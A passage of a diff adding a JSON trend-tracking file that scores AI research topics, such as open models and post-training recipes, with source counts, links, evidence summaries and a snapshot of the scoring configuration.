+      "score_fast_yesterday": 11.7,
+      "score_slow_yesterday": 10.6,
+      "direction": "rising",
+      "convergence_multiplier_applied": 1.5,
+      "momentum_7d_pct": null,
+      "score_7d_ago": null,
+      "score_30d_ago": null,
+      "score_90d_ago": null,
+      "score_180d_ago": null,
+      "first_seen": "2026-03-16",
+      "sustained_days": 3,
+      "source_type_count": 3,
+      "breadth_7d": 9,
+      "breadth_30d": 9,
+      "breadth_orgs_7d": [
+        "alibaba-qwen",
+        "cohere",
+        "danwoods",
+        "deepseek",
+        "interconnects",
+        "kimi",
+        "mistral",
+        "openseeker-paper",
+        "shintani"
+      ],
+      "high_breadth": true,
+      "source_mentions": {
+        "_note": "Uncapped raw counts — for transparency. Score uses source_mentions_capped.",
+        "long_form_blog": 4,
+        "medium_aggregator": 5,
+        "paper": 2
+      },
+      "source_mentions_capped": {
+        "_note": "Mentions after applying max_mentions_per_source_type cap. Score uses these.",
+        "long_form_blog": 4,
+        "medium_aggregator": 3,
+        "paper": 2
+      },
+      "supporting_files": [
+        "blogs/2026/03/2026-03-15.md",
+        "blogs/2026/03/2026-03-16.md",
+        "daily/2026/03/2026-03-16.md",
+        "papers/2026/03/2026-03-17.md",
+        "blogs/2026/03/2026-03-17.md",
+        "daily/2026/03/2026-03-17.md",
+        "blogs/2026/03/2026-03-18.md",
+        "papers/2026/03/2026-03-18.md",
+        "daily/2026/03/2026-03-18.md"
+      ],
+      "supporting_links": [
+        "https://www.interconnects.ai/p/the-next-phase-of-open-models",
+        "https://simonwillison.net/2026/Mar/18/llm-in-a-flash/",
+        "https://medium.com/@oliver_wood/the-solo-developers-guide-to-chinese-open-source-ai-in-2026-deepseek-qwen-and-why-you-should-60e470945289",
+        "https://medium.com/@logiolegion/best-agentic-ai-models-in-2026-e1a060c996be",
+        "https://arxiv.org/abs/2603.13398",
+        "https://arxiv.org/abs/2603.13594"
+      ],
+      "cluster_id": null,
+      "cluster_history": [],
+      "_evidence_summary": "Shintani's 'Solo Developer's Guide to Chinese Open-Source AI in 2026' argues Qwen+DeepSeek+Kimi triad covers most prod workloads at a fraction of GPT-5.4 spend. Dan Woods's Qwen3.5-397B running locally on a 48GB MacBook (90 Claude-Code-driven experiments) is the practical demonstration of Lambert's 'small distributed' tier. MiroThinker-1.7 (open research agent with verification) joins OpenSeeker in the open-frontier-agent thread. Logiolegion surveys Opus 4.6 vs GPT-5.4 vs Gemini 3.1 vs Kimi K2.5 on agentic tasks. Convergence multiplier 1.5× holds.",
+      "_breadth_method": "orgs added: deepseek (Chinese triad framing), kimi (also from agent-eval cohort), danwoods (Qwen-local case study), shintani (Chinese-OSS guide). Previously: 6 from yesterday."
+    },
+    {
+      "id": "post-training-recipes",
+      "label": "Post-training recipes (SFT-vs-RL, Mixture-of-Depths, sparsity-vs-depth, TERMINATOR, Online Experiential Learning)",
+      "sector": "Methods & research",
+      "sector_history": [
+        {
+          "date": "2026-03-17",
+          "from": null,
+          "to": "Methods & research",
+          "reason": "first appearance"
+        }
+      ],
+      "stage": "emerging",
+      "score": 12.5,
+      "score_fast": 13.1,
+      "score_slow": 12.5,
+      "raw_score_today": 14.0,
+      "score_fast_yesterday": 12.0,
+      "score_slow_yesterday": 12.0,
+      "direction": "rising",
+      "convergence_multiplier_applied": 1.0,
+      "momentum_7d_pct": null,
+      "score_7d_ago": null,
+      "score_30d_ago": null,
+      "score_90d_ago": null,
+      "score_180d_ago": null,
+      "first_seen": "2026-03-17",
+      "sustained_days": 2,
+      "source_type_count": 2,
+      "breadth_7d": 6,
+      "breadth_30d": 6,
+      "breadth_orgs_7d": [
+        "arxiv-cohort",
+        "hf-papers",
+        "jackclark",
+        "kenjin",
+        "kimi",
+        "online-experiential-paper"
+      ],
+      "high_breadth": true,
+      "source_mentions": {
+        "_note": "Uncapped raw counts — for transparency. Score uses source_mentions_capped.",
+        "paper": 6,
+        "long_form_blog": 2
+      },
+      "source_mentions_capped": {
+        "_note": "Mentions after applying max_mentions_per_source_type cap. Score uses these.",
+        "paper": 5,
+        "long_form_blog": 2
+      },
+      "supporting_files": [
+        "papers/2026/03/2026-03-17.md",
+        "papers/2026/03/2026-03-18.md",
+        "blogs/2026/03/2026-03-16.md",
+        "daily/2026/03/2026-03-17.md",
+        "daily/2026/03/2026-03-18.md"
+      ],
+      "supporting_links": [
+        "https://arxiv.org/abs/2603.13391",
+        "https://arxiv.org/abs/2603.15558",
+        "https://arxiv.org/abs/2603.12146",
+        "https://arxiv.org/abs/2603.15590",
+        "https://arxiv.org/abs/2603.16448",
+        "https://jack-clark.net/2026/03/16/importai-449-llms-training-other-llms-72b-distributed-training-run-computer-vision-is-harder-than-generative-text/"
+      ],
+      "cluster_id": null,
+      "cluster_history": [],
+      "_evidence_summary": "Online Experiential Learning for LMs (arXiv:2603.16448) joins TERMINATOR + SFT-vs-RL + Mixture-of-Depths + sparsity-vs-depth from yesterday: frames real-world deployment traces as a training signal — closes the loop between agent execution logs and continued model updates without separate annotation. Concrete pattern for 'deployed-traffic as training data.' Two source types still (paper + long_form_blog via Jack Clark's PostTrainBench). Slow EMA crossed 12.5; fast EMA at 13.1; direction = rising.",
+      "_breadth_method": "orgs added: online-experiential-paper. Previously: 5."
+    }
+  ],
+  "stage_movements": [
+    {
+      "topic": "agent-evaluation-observability",
+      "from": null,
+      "to": "emerging",
+      "first_observed_today": true
+    },
+    {
+      "topic": "agent-security",
+      "from": null,
+      "to": "emerging",
+      "first_observed_today": true
+    }
+  ],
+  "background_topics_count": 6,
+  "_background_topics_note": "Topics still below the gate (single-source-type or sub-threshold): tool-use-standards (DIVE + CCTU now papers-only — CCTU pulled into agent-evaluation-observability), long-context-vs-rag (IndexCache + LookaheadKV + Recursive-Language-Models-Meet-Uncertainty — papers-only), embodied-self-improvement (Steve-Evolving + EvoScientist + Spatial-TTT + Anticipatory Planning), apple-siri-redesign (single tech_news leak), distributed-training (Jack Clark 72B Bittensor — long-form only), hallucination-faithfulness (Thinking in Uncertainty + Krestnikov + Anatomy of a Lie — papers-only).",
+  "config_snapshot": {
+    "_purpose": "exact tuning constants in effect this run, for reproducibility",
+    "source_weights": {
+      "priority_vendor_blog": 5, "enterprise_vendor_blog": 4, "paper": 3,
+      "long_form_blog": 3, "linkedin_network_post": 3, "github_trending_signal": 3,
+      "tech_news": 2, "governance_source": 2, "hn_front_page": 2,
+      "github_watched_star_delta": 2, "medium_aggregator": 1,
+      "linkedin_hashtag_post": 1, "hn_comment_thread": 1,
+      "job_posting_skill_mention": 0.5
+    },
+    "convergence_multiplier": {"min_source_types": 3, "multiplier": 1.5},
+    "max_mentions_per_source_type": {
+      "priority_vendor_blog": 5, "enterprise_vendor_blog": 5, "paper": 5,
+      "long_form_blog": 5, "linkedin_network_post": 5, "tech_news": 5,
+      "governance_source": 5, "github_trending_signal": 5, "github_watched_star_delta": 5,
+      "hn_front_page": 5, "hn_comment_thread": 3, "medium_aggregator": 3,
+      "linkedin_hashtag_post": 3, "job_posting_skill_mention": 5
+    },
+    "stages": {
+      "emerging": {"score_range": [10, 30], "max_age_days": 21, "min_source_types": 2},
+      "consolidating": {"score_range": [30, 70], "min_sustained_days": 7, "min_source_types": 3},
+      "mainstream": {"score_range": [70, 999], "min_sustained_days": 30},
+      "fading": {"_trigger": "score declined >25% over rolling window AND was previously >=50"}
+    },
+    "sector_config": {
+      "min_sectors": 3, "max_sectors": 6, "min_topics_per_sector": 2,
+      "min_topics_for_new_sector": 3, "sector_dissolve_after_days_below_min": 5
+    },
+    "breadth_config": {
+      "window_short_days": 7, "window_long_days": 30,
+      "max_mentions_per_org_per_day": 2,
+      "thresholds": {"high_breadth_7d": 5, "very_high_breadth_7d": 8}
+    },
+    "clustering_config": {
+      "co_mention_window_days": 7, "min_co_mentions": 3, "min_cluster_size": 2,
+      "max_clusters": 8
+    },
+    "ema_alpha_fast": 0.3,
+    "ema_alpha_slow": 0.05
+  }
+}
